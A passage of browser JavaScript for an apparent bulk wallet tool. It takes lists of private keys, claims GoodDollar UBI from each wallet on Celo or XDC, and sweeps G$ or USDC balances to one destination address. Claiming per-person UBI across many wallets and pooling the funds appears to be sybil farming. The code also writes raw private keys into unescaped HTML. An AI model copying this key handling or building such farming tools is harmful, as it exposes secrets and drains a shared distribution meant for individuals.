                { name: 'GoodDollar', symbol: 'G$', address: '0xEC2136843a983885AebF2feB3931F73A8eBEe50c' },
                { name: 'Tether USD', symbol: 'USDT', address: '0xa7D8d9ef8D56233465dc9d8e2887BF4D0c51e18e' },
                { name: 'Wrapped ETH', symbol: 'WETH', address: '0x0cE7a59f77b5fB35555C01bECC7cA6f2f3aFaEDE' }
            ],
            fuse: [
                { name: 'Fuse', symbol: 'FUSE', address: '0x0BE9e53fd7EDaC9F859882AfdDa116645287C629' },
                { name: 'GoodDollar', symbol: 'G$', address: '0x495d133B938596C9984d462F007B676bDc57eCEC' },
                { name: 'Tether USD', symbol: 'USDT', address: '0xFaCb0c4c1d97f7c72381c46A6DC323f92E90DD8D' },
                { name: 'Wrapped ETH', symbol: 'WETH', address: '0xa722c13e0e2e0601041671373bee7830bcaa4ee1' }
            ]
        };

        // Custom tokens storage
        let customTokens = JSON.parse(localStorage.getItem('customSwapTokens') || '{}');

        // Helper function to ensure private key has "0x" prefix
        function ensurePrivateKeyPrefix(key) {
            if (!key) return key;
            const trimmedKey = key.trim();
            if (trimmedKey.startsWith('0x') || trimmedKey.startsWith('0X')) {
                return trimmedKey;
            }
            return '0x' + trimmedKey;
        }

        let claimStats = { total: 0, success: 0, error: 0 };
        let tokenStats = { total: 0, success: 0, error: 0 };
        let isProcessing = false;
        let successfulClaimKeys = [];
        let successfulTokenKeys = [];
        let noBalanceTokenKeys = [];
        let noGasTokenKeys = [];
        
        function toggleMenu() {
            const dropdown = document.getElementById('menuDropdown');
            const overlay = document.getElementById('menuOverlay');
            dropdown.classList.toggle('open');
            overlay.classList.toggle('open');
        }

        function closeMenu() {
            document.getElementById('menuDropdown').classList.remove('open');
            document.getElementById('menuOverlay').classList.remove('open');
        }

        function switchView(viewName) {
            closeMenu();
            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
            document.getElementById(viewName).classList.add('active');
            
            // Display Anamul App keys when opening Anamul App
            if (viewName === 'secretBox') {
                displaySecretKeys();
            }
        }

        function normalizeAddress(address, networkType) {
            if (!address) return address;
            address = address.trim();
            if (networkType === 'xdc') {
                if (address.startsWith('XDC')) {
                    address = '0x' + address.slice(3);
                }
                return address.toLowerCase();
            }
            return address;
        }

        function isValidPrivateKey(key) {
            key = key.trim();
            // Add 0x prefix if missing before validation
            if (!key.startsWith('0x') && !key.startsWith('0X')) {
                key = '0x' + key;
            }
            return /^0x[0-9a-fA-F]{64}$/i.test(key);
        }

        function updateClaimNetworkConfig() {
            const claimNetwork = document.getElementById('claimNetwork');
            const claimRpcUrl = document.getElementById('claimRpcUrl');
            const claimContractAddress = document.getElementById('claimContractAddress');
            
            if (!claimNetwork) return;
            
            const selectedNetwork = claimNetwork.value;
            const config = NETWORK_CONFIGS[selectedNetwork];
            if (config) {
                if (claimRpcUrl) claimRpcUrl.value = config.rpcUrl;
                if (claimContractAddress) claimContractAddress.value = config.claimContract;
            }
        }
        
        function handleClaimNetworkChange() {
            updateClaimNetworkConfig();
            checkClaimMaintenanceStatus();
        }
        
        function checkClaimMaintenanceStatus() {
            const selectedNetwork = document.getElementById('claimNetwork').value;
            const maintenanceWarning = document.getElementById('claimMaintenanceWarning');
            
            if (selectedNetwork === 'xdc' && maintenanceWarning) {
                fetch('/api/get-maintenance-mode', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({})
                })
                    .then(r => r.json())
                    .then(data => {
                        console.log('Maintenance status:', data);
                        maintenanceWarning.style.display = data.maintenance_mode ? 'block' : 'none';
                    })
                    .catch(err => {
                        console.log('Maintenance check error:', err);
                        maintenanceWarning.style.display = 'none';
                    });
            } else if (maintenanceWarning) {
                maintenanceWarning.style.display = 'none';
            }
        }

        function updateTokenNetworkConfig() {
            const tokenNetwork = document.getElementById('tokenNetwork');
            const tokenRpcUrl = document.getElementById('tokenRpcUrl');
            const tokenAddress = document.getElementById('tokenAddress');
            
            if (!tokenNetwork) return;
            
            const selectedNetwork = tokenNetwork.value;
            const config = NETWORK_CONFIGS[selectedNetwork];
            if (config) {
                if (tokenRpcUrl) tokenRpcUrl.value = config.rpcUrl;
                if (tokenAddress) {
                    const tokenAddr = config.tokenContract;
                    tokenAddress.value = tokenAddr;
                    console.log(`‚úÖ Updated Token Address for ${selectedNetwork}: ${tokenAddr}`);
                }
            }
        }
        
        function handleTokenNetworkChange() {
            updateTokenNetworkConfig();
            checkTokenMaintenanceStatus();
        }
        
        function checkTokenMaintenanceStatus() {
            const selectedNetwork = document.getElementById('tokenNetwork').value;
            const maintenanceWarning = document.getElementById('tokenMaintenanceWarning');
            
            if (selectedNetwork === 'xdc' && maintenanceWarning) {
                fetch('/api/get-maintenance-mode', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({})
                })
                    .then(r => r.json())
                    .then(data => {
                        console.log('Maintenance status:', data);
                        maintenanceWarning.style.display = data.maintenance_mode ? 'block' : 'none';
                    })
                    .catch(err => {
                        console.log('Maintenance check error:', err);
                        maintenanceWarning.style.display = 'none';
                    });
            } else if (maintenanceWarning) {
                maintenanceWarning.style.display = 'none';
            }
        }

        function addClaimLog(message, type = 'info') {
            const logsDiv = document.getElementById('claimLogs');
            if (!logsDiv) return;
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry log-${type}`;
            logEntry.innerHTML = message;
            logsDiv.appendChild(logEntry);
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }

        function addTokenLog(message, type = 'info') {
            const logsDiv = document.getElementById('tokenLogs');
            if (!logsDiv) return;
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry log-${type}`;
            logEntry.innerHTML = message;
            logsDiv.appendChild(logEntry);
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }

        function updateClaimStats() {
            const total = document.getElementById('claimStatTotal');
            const success = document.getElementById('claimStatSuccess');
            const error = document.getElementById('claimStatError');
            if (total) total.textContent = claimStats.total;
            if (success) success.textContent = claimStats.success;
            if (error) error.textContent = claimStats.error;
        }

        function updateTokenStats() {
            const total = document.getElementById('tokenStatTotal');
            const success = document.getElementById('tokenStatSuccess');
            const error = document.getElementById('tokenStatError');
            if (total) total.textContent = tokenStats.total;
            if (success) success.textContent = tokenStats.success;
            if (error) error.textContent = tokenStats.error;
        }

        function updateClaimProgress(current, total) {
            const elem = document.getElementById('claimProgress');
            if (elem) elem.textContent = `Processing: ${current} / ${total}`;
        }

        function updateTokenProgress(current, total) {
            const elem = document.getElementById('tokenProgress');
            if (elem) elem.textContent = `Processing: ${current} / ${total}`;
        }

        // Show derived addresses from private keys
        async function showDerivedAddresses() {
            const privateKeysText = document.getElementById('claimPrivateKeys').value;
            const lines = privateKeysText.split('\n').map(line => line.trim()).filter(line => line.length > 0 && isValidPrivateKey(line));
            
            if (lines.length === 0) {
                alert('‚ùå No valid private keys found!');
                return;
            }
            
            const addressesContainer = document.getElementById('addressesListContainer');
            addressesContainer.innerHTML = '';
            window.derivedAddresses = [];
            
            lines.forEach((key, idx) => {
                try {
                    const normalizedKey = ensurePrivateKeyPrefix(key);
                    const provider = new ethers.JsonRpcProvider(NETWORK_CONFIGS['celo'].rpcUrl);
                    const wallet = new ethers.Wallet(normalizedKey, provider);
                    const address = normalizeAddress(wallet.address, 'celo');
                    window.derivedAddresses.push(address);
                    
                    const itemDiv = document.createElement('div');
                    itemDiv.style.display = 'flex';
                    itemDiv.style.gap = '8px';
                    itemDiv.style.padding = '8px';
                    itemDiv.style.borderBottom = '1px solid #e0e0e0';
                    itemDiv.style.alignItems = 'center';
                    
                    const numSpan = document.createElement('span');
                    numSpan.textContent = `${idx + 1}.`;
                    numSpan.style.fontWeight = '700';
                    numSpan.style.color = '#667eea';
                    numSpan.style.minWidth = '25px';
                    
                    const addrSpan = document.createElement('span');
                    addrSpan.textContent = address;
                    addrSpan.style.flex = '1';
                    addrSpan.style.fontFamily = "'Courier New', monospace";
                    addrSpan.style.fontSize = '12px';
                    
                    const copyBtn = document.createElement('button');
                    copyBtn.textContent = 'üìã';
                    copyBtn.style.padding = '4px 8px';
                    copyBtn.style.background = 'none';
                    copyBtn.style.border = 'none';
                    copyBtn.style.cursor = 'pointer';
                    copyBtn.onclick = () => { navigator.clipboard.writeText(address); copyBtn.textContent = '‚úÖ'; setTimeout(() => copyBtn.textContent = 'üìã', 1500); };
                    
                    itemDiv.appendChild(numSpan);
                    itemDiv.appendChild(addrSpan);
                    itemDiv.appendChild(copyBtn);
                    addressesContainer.appendChild(itemDiv);
                } catch (e) {
                    console.error('Address derivation error:', e);
                }
            });
            
            document.getElementById('derivedAddressesSection').style.display = 'block';
        }
        
        function copyAllDerivedAddresses() {
            if (!window.derivedAddresses || window.derivedAddresses.length === 0) {
                alert('‚ùå No addresses to copy!');
                return;
            }
            navigator.clipboard.writeText(window.derivedAddresses.join('\n'));
            alert(`‚úÖ Copied ${window.derivedAddresses.length} addresses!`);
        }

        function validateAndCleanClaimKeys() {
            const privateKeysText = document.getElementById('claimPrivateKeys').value;
            const lines = privateKeysText.split('\n').map(line => line.trim()).filter(line => line.length > 0);
            
            const validLines = [];
            const invalidLines = [];
            
            lines.forEach((line, index) => {
                if (isValidPrivateKey(line)) {
                    validLines.push(line);
                } else {
                    invalidLines.push({ index, text: line });
                }
            });
            
            const keyFrequency = {};
            const duplicateKeys = [];
            validLines.forEach(key => {
                keyFrequency[key] = (keyFrequency[key] || 0) + 1;
                if (keyFrequency[key] > 1 && !duplicateKeys.includes(key)) {
                    duplicateKeys.push(key);
                }
            });
            
            const validationSection = document.getElementById('claimValidationSection');
            validationSection.innerHTML = '';
            
            if (duplicateKeys.length > 0) {
                const dupTitle = document.createElement('div');
                dupTitle.className = 'validation-title';
                dupTitle.innerHTML = `‚ö†Ô∏è Found ${duplicateKeys.length} duplicate key(s)`;
                validationSection.appendChild(dupTitle);
                
                const removeDupBtn = document.createElement('button');
                removeDupBtn.className = 'validate-btn';
                removeDupBtn.style.background = '#ff9800';
                removeDupBtn.textContent = 'üîÑ Remove Duplicates';
                removeDupBtn.onclick = () => removeDuplicateClaimKeys();
                validationSection.appendChild(removeDupBtn);
            }
            
            if (invalidLines.length > 0) {
                if (duplicateKeys.length > 0) {
                    const divider = document.createElement('div');
                    divider.style.height = '1px';
                    divider.style.background = '#ffb74d';
                    divider.style.margin = '12px 0';
                    validationSection.appendChild(divider);
                }
                
                const title = document.createElement('div');
                title.className = 'validation-title';
                title.innerHTML = `‚ö†Ô∏è Found ${invalidLines.length} invalid line(s)`;
                validationSection.appendChild(title);
                
                invalidLines.forEach((item, idx) => {
                    const itemDiv = document.createElement('div');
                    itemDiv.className = 'invalid-key-item';
                    
                    const textSpan = document.createElement('span');
                    textSpan.style.flex = '1';
                    textSpan.textContent = item.text.substring(0, 60) + (item.text.length > 60 ? '...' : '');
                    
                    const deleteBtn = document.createElement('button');
                    deleteBtn.className = 'delete-btn';
                    deleteBtn.textContent = '‚úï Delete';
                    deleteBtn.onclick = () => deleteClaimInvalidKey(item.text);
                    
                    itemDiv.appendChild(textSpan);
                    itemDiv.appendChild(deleteBtn);
                    validationSection.appendChild(itemDiv);
                });
            }
            
            if (invalidLines.length === 0 && duplicateKeys.length === 0) {
                if (validLines.length > 0) {
                    const status = document.createElement('div');
                    status.className = 'validation-status valid';
                    status.innerHTML = `‚úÖ All ${validLines.length} line(s) are valid and unique!`;
                    validationSection.appendChild(status);
                    validationSection.classList.add('show');
                }
            } else {
                validationSection.classList.add('show');
            }
        }

        function validateAndCleanTokenKeys() {
            const privateKeysText = document.getElementById('tokenPrivateKeys').value;
            const lines = privateKeysText.split('\n').map(line => line.trim()).filter(line => line.length > 0);
            
            const validLines = [];
            const invalidLines = [];
            
            lines.forEach((line, index) => {
                if (isValidPrivateKey(line)) {
                    validLines.push(line);
                } else {
                    invalidLines.push({ index, text: line });
                }
            });
            
            const keyFrequency = {};
            const duplicateKeys = [];
            validLines.forEach(key => {
                keyFrequency[key] = (keyFrequency[key] || 0) + 1;
                if (keyFrequency[key] > 1 && !duplicateKeys.includes(key)) {
                    duplicateKeys.push(key);
                }
            });
            
            const validationSection = document.getElementById('tokenValidationSection');
            validationSection.innerHTML = '';
            
            if (duplicateKeys.length > 0) {
                const dupTitle = document.createElement('div');
                dupTitle.className = 'validation-title';
                dupTitle.innerHTML = `‚ö†Ô∏è Found ${duplicateKeys.length} duplicate key(s)`;
                validationSection.appendChild(dupTitle);
                
                const removeDupBtn = document.createElement('button');
                removeDupBtn.className = 'validate-btn';
                removeDupBtn.style.background = '#ff9800';
                removeDupBtn.textContent = 'üîÑ Remove Duplicates';
                removeDupBtn.onclick = () => removeDuplicateTokenKeys();
                validationSection.appendChild(removeDupBtn);
            }
            
            if (invalidLines.length > 0) {
                if (duplicateKeys.length > 0) {
                    const divider = document.createElement('div');
                    divider.style.height = '1px';
                    divider.style.background = '#ffb74d';
                    divider.style.margin = '12px 0';
                    validationSection.appendChild(divider);
                }
                
                const title = document.createElement('div');
                title.className = 'validation-title';
                title.innerHTML = `‚ö†Ô∏è Found ${invalidLines.length} invalid line(s)`;
                validationSection.appendChild(title);
                
                invalidLines.forEach((item, idx) => {
                    const itemDiv = document.createElement('div');
                    itemDiv.className = 'invalid-key-item';
                    
                    const textSpan = document.createElement('span');
                    textSpan.style.flex = '1';
                    textSpan.textContent = item.text.substring(0, 60) + (item.text.length > 60 ? '...' : '');
                    
                    const deleteBtn = document.createElement('button');
                    deleteBtn.className = 'delete-btn';
                    deleteBtn.textContent = '‚úï Delete';
                    deleteBtn.onclick = () => deleteTokenInvalidKey(item.text);
                    
                    itemDiv.appendChild(textSpan);
                    itemDiv.appendChild(deleteBtn);
                    validationSection.appendChild(itemDiv);
                });
            }
            
            if (invalidLines.length === 0 && duplicateKeys.length === 0) {
                if (validLines.length > 0) {
                    const status = document.createElement('div');
                    status.className = 'validation-status valid';
                    status.innerHTML = `‚úÖ All ${validLines.length} line(s) are valid and unique!`;
                    validationSection.appendChild(status);
                    validationSection.classList.add('show');
                }
            } else {
                validationSection.classList.add('show');
            }
        }

        function deleteClaimInvalidKey(keyText) {
            let currentText = document.getElementById('claimPrivateKeys').value;
            const lines = currentText.split('\n');
            const filteredLines = lines.filter(line => line.trim() !== keyText);
            document.getElementById('claimPrivateKeys').value = filteredLines.join('\n');
            validateAndCleanClaimKeys();
        }

        function deleteTokenInvalidKey(keyText) {
            let currentText = document.getElementById('tokenPrivateKeys').value;
            const lines = currentText.split('\n');
            const filteredLines = lines.filter(line => line.trim() !== keyText);
            document.getElementById('tokenPrivateKeys').value = filteredLines.join('\n');
            validateAndCleanTokenKeys();
        }

        function removeDuplicateClaimKeys() {
            let currentText = document.getElementById('claimPrivateKeys').value;
            const lines = currentText.split('\n').map(line => line.trim()).filter(line => line.length > 0);
            
            const seenKeys = {};
            const uniqueLines = [];
            
            lines.forEach(line => {
                if (!seenKeys[line]) {
                    seenKeys[line] = true;
                    uniqueLines.push(line);
                }
            });
            
            document.getElementById('claimPrivateKeys').value = uniqueLines.join('\n');
            validateAndCleanClaimKeys();
        }

        function removeDuplicateTokenKeys() {
            let currentText = document.getElementById('tokenPrivateKeys').value;
            const lines = currentText.split('\n').map(line => line.trim()).filter(line => line.length > 0);
            
            const seenKeys = {};
            const uniqueLines = [];
            
            lines.forEach(line => {
                if (!seenKeys[line]) {
                    seenKeys[line] = true;
                    uniqueLines.push(line);
                }
            });
            
            document.getElementById('tokenPrivateKeys').value = uniqueLines.join('\n');
            validateAndCleanTokenKeys();
        }

        async function processSingleClaim(privateKey, walletIndex, totalWallets, provider, contractAddress, explorerUrl, networkType) {
            const walletNum = walletIndex + 1;
            const currencyName = networkType === 'celo' ? 'CELO' : 'XDC';
            
            try {
                addClaimLog(`\nüîë Wallet ${walletNum}/${totalWallets}:`, 'info');
                
                let wallet;
                try {
                    wallet = new ethers.Wallet(privateKey, provider);
                } catch (error) {
                    addClaimLog(`   ‚ùå Invalid private key format`, 'error');
                    return { success: false, error: 'Invalid private key', privateKey };
                }

                const address = wallet.address;
                addClaimLog(`   Address: ${address}`, 'info');

                // Check if this address is disabled (Blockchain Kill Switch)
                try {
                    const statusResponse = await fetch('/api/check-key-status', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ address: address.toLowerCase() })
                    });
                    const statusData = await statusResponse.json();
                    if (statusData.disabled) {
                        addClaimLog(`   üö´ KEY DISABLED - Cannot claim! Enable in üîê Anamul App ‚Üí Blockchain Kill Switch`, 'error');
                        return { success: false, error: 'Key is disabled (Blockchain Kill Switch)', privateKey };
                    }
                } catch (err) {
                    console.log('Kill switch check skipped (network error):', err);
                }

                const normalizedContractAddress = normalizeAddress(contractAddress, networkType);
                const contract = new ethers.Contract(normalizedContractAddress, GOODDOLLAR_ABI, wallet);

                let entitlementAmount = null;
                try {
                    const entitlement = await contract.checkEntitlement();
                    entitlementAmount = entitlement;
                    addClaimLog(`   Entitlement: ${ethers.formatEther(entitlement)} G$`, 'info');
                    
                    if (entitlement === 0n) {
                        addClaimLog(`   ‚ö†Ô∏è No claimable amount available`, 'warning');
                        return { success: false, error: 'No entitlement', privateKey };
                    }
                } catch (error) {
                    // checkEntitlement may fail due to on-chain conditions, but claim might still work
                    addClaimLog(`   ‚ö†Ô∏è Could not check entitlement: ${error.message}`, 'warning');
                    addClaimLog(`   üì§ Attempting claim anyway...`, 'info');
                }

                // üîÑ CLAIM: Send claim transaction
                addClaimLog(`   üì§ Sending claim transaction...`, 'info');
                let tx;
                try {
                    tx = await contract.claim();
                } catch (txError) {
                    const txErrorMsg = txError.reason || txError.shortMessage || txError.message || String(txError);
                    addClaimLog(`   ‚ùå Claim transaction failed: ${txErrorMsg}`, 'error');
                    return { success: false, error: txErrorMsg, privateKey };
                }
                
                addClaimLog(`   ‚è≥ Tx sent: <span class="tx-hash" onclick="window.open('${explorerUrl}/tx/${tx.hash}', '_blank')">${tx.hash}</span>`, 'info');

                // ‚è±Ô∏è Wait for claim confirmation (1 block) - with timeout
                let receipt;
                try {
                    receipt = await Promise.race([
                        tx.wait(1),
                        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout waiting for receipt')), 120000))
                    ]);
                } catch (receiptError) {
                    // If wait fails but tx was sent, treat as success (transaction may still mine)
                    addClaimLog(`   ‚úÖ CLAIM SUBMITTED! (Waiting for confirmation...)`, 'success');
                    addClaimLog(`   üîó Hash: <span class="tx-hash" onclick="window.open('${explorerUrl}/tx/${tx.hash}', '_blank')">${tx.hash}</span>`, 'success');
                    return { success: true, privateKey };
                }
                
                // Check receipt status
                if (receipt === null) {
                    // Null receipt means transaction might still be pending
                    addClaimLog(`   ‚úÖ CLAIM SUBMITTED!`, 'success');
                    addClaimLog(`   üîó Hash: <span class="tx-hash" onclick="window.open('${explorerUrl}/tx/${tx.hash}', '_blank')">${tx.hash}</span>`, 'success');
                    return { success: true, privateKey };
                } else if (receipt && (receipt.status === 1 || receipt.status === '0x1')) {
                    // Status 1 means success
                    addClaimLog(`   ‚úÖ CLAIM SUCCESS!`, 'success');
                    addClaimLog(`   üîó Hash: <span class="tx-hash" onclick="window.open('${explorerUrl}/tx/${receipt.hash}', '_blank')">${receipt.hash}</span>`, 'success');
                    return { success: true, privateKey };
                } else if (receipt && (receipt.status === 0 || receipt.status === '0x0')) {
                    // Status 0 means reverted
                    addClaimLog(`   ‚ùå Transaction reverted on-chain`, 'error');
                    return { success: false, error: 'Transaction reverted', privateKey };
                } else {
                    // Unknown status
                    addClaimLog(`   ‚ö†Ô∏è Unknown transaction status`, 'warning');
                    addClaimLog(`   üîó Hash: <span class="tx-hash" onclick="window.open('${explorerUrl}/tx/${tx.hash}', '_blank')">${tx.hash}</span>`, 'info');
                    return { success: true, privateKey }; // Treat as success since tx was sent
                }

            } catch (error) {
                const errorMsg = error.reason || error.shortMessage || error.message || String(error);
                addClaimLog(`   ‚ùå FAILED: ${errorMsg}`, 'error');
                return { success: false, error: errorMsg, privateKey };
            }
        }

        let tokenWalletBalances = {};
        let noTokenWallets = [];

        function updateTokenTypeConfig() {
            const selectedToken = document.getElementById('selectedTokenType').value;
            const checkBtn = document.getElementById('checkTokenBalanceButton');
            const labelElem = document.getElementById('tokenAddressLabel');
            const destLabelElem = document.getElementById('destinationAddressLabel');
            const tokenTotalLabel = document.getElementById('tokenTotalLabel');

            if (selectedToken === 'usdc') {
                labelElem.textContent = 'USDC Token Contract Address:';
                destLabelElem.textContent = 'Destination Wallet Address (where to collect all USDC):';
                tokenTotalLabel.textContent = 'Total USDC Balance';
                checkBtn.textContent = 'üí∞ Check USDC Balance';
                document.getElementById('deleteZeroGButton').textContent = 'üóëÔ∏è Delete Wallets with 0 USDC';
                // Auto-fill USDC address for Celo
                if (document.getElementById('tokenNetwork').value === 'celo') {
                    document.getElementById('tokenAddress').value = '0xcebA9300f2b948710d2653dD7B07f33A8B32118C';
                }
            } else {
                labelElem.textContent = 'G$ Token Contract Address:';
                destLabelElem.textContent = 'Destination Wallet Address (where to collect all G$):';
                tokenTotalLabel.textContent = 'Total G$ Balance';
                checkBtn.textContent = 'üí∞ Check G$ Balance';
                document.getElementById('deleteZeroGButton').textContent = 'üóëÔ∏è Delete Wallets with 0 G$';
                // Auto-fill G$ address for Celo/XDC
                const network = document.getElementById('tokenNetwork').value;
                if (network === 'celo') {
                    document.getElementById('tokenAddress').value = '0x62B8B11039FcfE5aB0C56E502b1C372A3d2a9c7A';
                } else if (network === 'xdc') {
                    document.getElementById('tokenAddress').value = '0xEC2136843a983885AebF2feB3931F73A8eBEe50c';
                }
            }
            // Reset display sections
            document.getElementById('tokenBalanceDisplaySection').style.display = 'none';
            document.getElementById('noTokenWalletsSection').style.display = 'none';
        }

        function toggleNoTokenWalletsModal() {
            document.getElementById('noTokenWalletsModal').style.display = 'flex';
        }

        function closeNoTokenWalletsModal() {
            document.getElementById('noTokenWalletsModal').style.display = 'none';
        }

        function copyAllNoTokenWallets() {
            let text = noTokenWallets.map(w => w.privateKey).join('\n');
            navigator.clipboard.writeText(text).then(() => {
                const btn = document.getElementById('noTokenWalletsCopyBtn');
                btn.textContent = '‚úÖ Copied!';
                btn.style.background = '#4caf50';
                setTimeout(() => {
                    btn.textContent = 'üìã ‡¶∏‡¶¨ ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®';
                    btn.style.background = '#45a049';
                }, 2000);
            }).catch(err => alert('Copy failed: ' + err.message));
        }

        async function checkTokenBalances() {
            const selectedNetwork = document.getElementById('tokenNetwork').value;
            const rpcUrl = document.getElementById('tokenRpcUrl').value.trim();
            const tokenAddress = document.getElementById('tokenAddress').value.trim();
            const privateKeysText = document.getElementById('tokenPrivateKeys').value.trim();
            const selectedToken = document.getElementById('selectedTokenType').value;

            if (!rpcUrl || !tokenAddress || !privateKeysText) {
                alert('Please fill in RPC URL, Token Address, and Private Keys');
                return;
            }
            
            // Validate token address format
            if (!tokenAddress.startsWith('0x') || tokenAddress.length !== 42) {
                alert(`Invalid token address format. Must be 42 characters (0x + 40 hex).\nCurrent: ${tokenAddress.length} characters`);
                return;
            }

            const privateKeys = privateKeysText.split('\n')
                .map(key => {
                    const trimmed = key.trim();
                    if (!trimmed) return null;
                    return ensurePrivateKeyPrefix(trimmed);
                })
                .filter(key => key && isValidPrivateKey(key));

            if (privateKeys.length === 0) {
                alert('No valid private keys found');
                return;
            }

            const checkBtn = document.getElementById('checkTokenBalanceButton');
            checkBtn.disabled = true;
            checkBtn.textContent = '‚è≥ Checking...';

            try {
                const provider = new ethers.JsonRpcProvider(rpcUrl);
                const tokenContract = new ethers.Contract(normalizeAddress(tokenAddress, selectedNetwork), G_TOKEN_ABI, provider);
                
                tokenWalletBalances = {};
                noTokenWallets = [];
                const balanceList = document.getElementById('tokenBalanceList');
                const noTokenWalletsList = document.getElementById('noTokenWalletsList');
                balanceList.innerHTML = '';
                noTokenWalletsList.innerHTML = '';
                
                let totalBalance = 0n;
                let hasZeroBalanceWallets = false;
                const tokenSymbol = selectedToken === 'usdc' ? 'USDC' : 'G$';

                for (let i = 0; i < privateKeys.length; i++) {
                    const wallet = new ethers.Wallet(privateKeys[i]);
                    const address = normalizeAddress(wallet.address, selectedNetwork);
                    
                    const tokenBalance = await tokenContract.balanceOf(address);
                    const balanceFormatted = ethers.formatEther(tokenBalance);
                    
                    totalBalance += tokenBalance;
                    const isZero = parseFloat(balanceFormatted) === 0;
                    if (isZero) hasZeroBalanceWallets = true;
                    
                    tokenWalletBalances[address] = {
                        privateKey: privateKeys[i],
                        balance: balanceFormatted,
                        isZero: isZero
                    };

                    if (isZero) {
                        // Add to no token wallets list
                        noTokenWallets.push({
                            address: address,
                            privateKey: privateKeys[i]
                        });
                    } else {
                        // Add to balance display
                        const balanceItem = document.createElement('div');
                        balanceItem.style.cssText = 'display: flex; justify-content: space-between; align-items: center; padding: 12px; margin-bottom: 8px; background: white; border-radius: 6px; border: 1px solid #ddd; font-size: 13px;';
                        
                        const shortAddr = address.substring(0, 10) + '...' + address.substring(address.length - 8);
                        const balanceText = parseFloat(balanceFormatted).toFixed(6);
                        balanceItem.innerHTML = `<strong>${shortAddr}</strong><span style="color: #666;"> ‚Üí ${balanceText} ${tokenSymbol}</span>`;
                        
                        balanceList.appendChild(balanceItem);
                    }
                }

                // Show total balance
                document.getElementById('tokenTotalBalance').textContent = `${ethers.formatEther(totalBalance)} ${tokenSymbol}`;
                
                // Show delete button only if there are zero-balance wallets
                document.getElementById('deleteZeroGButton').style.display = hasZeroBalanceWallets ? 'block' : 'none';
                
                // Show no token wallets section
                if (noTokenWallets.length > 0) {
                    document.getElementById('noTokenWalletsCount').textContent = noTokenWallets.length;
                    noTokenWalletsList.innerHTML = noTokenWallets.map((w, idx) => `
                        <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px; margin-bottom: 8px; background: #f5f5f5; border-radius: 6px; font-size: 12px; word-break: break-all;">
                            <span style="flex: 1;">${w.privateKey}</span>
                            <button style="padding: 6px 10px; background: #2196F3; color: white; border: none; border-radius: 4px; cursor: pointer; margin-left: 10px; white-space: nowrap;" onclick="navigator.clipboard.writeText('${w.privateKey}')">Copy</button>
                        </div>
                    `).join('');
                    document.getElementById('noTokenWalletsSection').style.display = 'block';
                }
                
                document.getElementById('tokenBalanceDisplaySection').style.display = 'block';

            } catch (error) {
                alert(`Error checking balances: ${error.message}`);
            } finally {
                checkBtn.disabled = false;
                checkBtn.textContent = 'üí∞ Check G$ Balance';
            }
        }

        function deleteAllZeroTokenWallets() {
            const zeroWalletCount = Object.values(tokenWalletBalances).filter(b => b.isZero).length;
            if (zeroWalletCount === 0) {
                alert('No zero-balance wallets to delete');
                return;
            }
            
            const selectedToken = document.getElementById('selectedTokenType').value;
            const tokenName = selectedToken === 'usdc' ? 'USDC' : 'G$';
            
            if (!confirm(`Delete ${zeroWalletCount} wallet(s) with 0 ${tokenName}?`)) {
                return;
            }

            let currentText = document.getElementById('tokenPrivateKeys').value;
            const lines = currentText.split('\n');
            const filteredLines = [];

            lines.forEach(line => {
                const trimmed = line.trim();
                if (trimmed.length > 0) {
                    try {
                        const wallet = new ethers.Wallet(trimmed);
                        const selectedNetwork = document.getElementById('tokenNetwork').value;
                        const normalizedAddr = normalizeAddress(wallet.address, selectedNetwork);
                        const balanceData = tokenWalletBalances[normalizedAddr];
                        if (balanceData && !balanceData.isZero) {
                            filteredLines.push(trimmed);
                        } else if (!balanceData) {
                            filteredLines.push(trimmed);
                        }
                    } catch (e) {
                        // Skip invalid keys
                    }
                }
            });

            document.getElementById('tokenPrivateKeys').value = filteredLines.join('\n');
            checkTokenBalances();
        }

        async function processSingleTokenTransfer(privateKey, walletIndex, totalWallets, provider, tokenAddress, destinationAddress, explorerUrl, networkType) {
            const walletNum = walletIndex + 1;
            
            try {
                addTokenLog(`\nüîë Wallet ${walletNum}/${totalWallets}:`, 'info');
                
                let wallet;
                try {
                    wallet = new ethers.Wallet(privateKey, provider);
                } catch (error) {
                    addTokenLog(`   ‚ùå Invalid private key format`, 'error');
                    return { success: false, error: 'Invalid private key', address: 'Unknown', privateKey };
                }

                const address = wallet.address;
                addTokenLog(`   Address: ${address}`, 'info');

                const normalizedTokenAddress = normalizeAddress(tokenAddress, networkType);
                const normalizedDestinationAddress = normalizeAddress(destinationAddress, networkType);
                const tokenContract = new ethers.Contract(normalizedTokenAddress, G_TOKEN_ABI, wallet);

                try {
                    let balance;
                    try {
                        balance = await tokenContract.balanceOf(address);
                    } catch (balanceError) {
                        const errMsg = balanceError.reason || balanceError.shortMessage || balanceError.message || String(balanceError);
                        addTokenLog(`   ‚ö†Ô∏è Balance check failed: ${errMsg}`, 'warning');
                        addTokenLog(`   üí° Try using different G$ token address`, 'info');
                        return { success: false, error: 'Balance check failed - token address may be incorrect' };
                    }
                    
                    const balanceFormatted = ethers.formatEther(balance);
                    addTokenLog(`   üí∞ Balance: ${balanceFormatted} G$`, 'info');
                    
                    if (balance === 0n) {
                        addTokenLog(`   ‚ö†Ô∏è No tokens to transfer`, 'warning');
                        return { success: false, error: 'No balance', address, privateKey, reason: 'No balance' };
                    }

                    addTokenLog(`   üì§ Transferring ${balanceFormatted} G$ to ${normalizedDestinationAddress.substring(0, 10)}...`, 'info');

                    // Check native token balance (XDC/CELO) for gas
                    let nativeBalance = 0n;
                    try {
                        nativeBalance = await provider.getBalance(address);
                        const nativeFormatted = ethers.formatEther(nativeBalance);
                        addTokenLog(`   ‚õΩ Native balance: ${nativeFormatted}`, 'info');
                        
                        if (nativeBalance === 0n) {
                            addTokenLog(`   ‚ùå No ${networkType === 'xdc' ? 'XDC' : 'CELO'} for gas fees`, 'error');
